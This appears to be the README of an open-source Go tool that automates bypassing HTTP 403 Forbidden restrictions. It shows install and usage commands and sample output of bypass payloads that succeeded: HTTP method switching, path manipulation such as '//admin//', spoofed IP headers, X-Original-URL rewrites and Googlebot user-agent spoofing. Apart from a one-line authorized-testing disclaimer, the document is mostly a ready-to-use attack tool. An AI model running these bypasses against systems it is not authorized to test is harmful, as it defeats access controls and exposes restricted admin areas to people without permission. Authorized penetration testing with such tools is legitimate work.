
<p align="center">
  <b>Smash through 403 Forbidden.</b><br>
  <code>300+ techniques</code> · <code>11 vectors</code> · <code>~4 seconds</code> · <code>Go</code> · <code>zero deps</code>
</p>

---

### Install

```
go install github.com/YOUR_USERNAME/fck403@latest
```

### Run

```bash
fck403 https://target.com admin
fck403 -u https://target.com -p admin -t 20 -s         # success only
fck403 -u https://target.com -p admin -o json           # json output
fck403 -u https://target.com -p admin -x http://127.0.0.1:8080  # burp proxy
```

### Flags

```
-u   target URL                    -c   cookie
-p   target path                   -H   custom header
-t   threads (default 10)          -s   show only bypasses
-T   timeout (default 10s)         -v   verbose
-o   output: text/json/csv         -x   proxy URL
```

### What it does

Fires 319 requests at a `403` endpoint using every known bypass technique. Shows you what got through.

```
  [200]   8921 B   0.41s  METHOD           -X PATCH
  [403]   1234 B   0.38s  METHOD           -X PUT
  [200]   9102 B   0.44s  PATH             //admin//
  [200]   9001 B   0.41s  IP-HEADER        -H 'True-Client-IP: 127.0.0.1'
  [200]   8800 B   0.44s  REWRITE          -H 'X-Original-URL: /admin'
  [200]   9100 B   0.39s  USER-AGENT       -A 'Googlebot/2.1'

  SMASHED THROUGH:
  [200]   8921 B  METHOD           -X PATCH
  [200]   9102 B  PATH             //admin//
  [200]   9001 B  IP-HEADER        -H 'True-Client-IP: 127.0.0.1'
```

### Vectors

`HTTP Methods` · `Path Manipulation` · `IP Spoofing Headers` · `URL Rewrite` · `User-Agent Spoofing` · `Referer Spoofing` · `Host Header` · `Hop-by-Hop Abuse` · `Protocol Version` · `Direct IP` · `API Version Fuzzing`

### Disclaimer

Authorized testing only. Don't be stupid.

### Credits

Based on [iamj0ker/bypass-403](https://github.com/iamj0ker/bypass-403). Techniques from [HackTricks](https://book.hacktricks.xyz), [Vidoc](https://blog.vidocsecurity.com), [PortSwigger](https://portswigger.net/research).
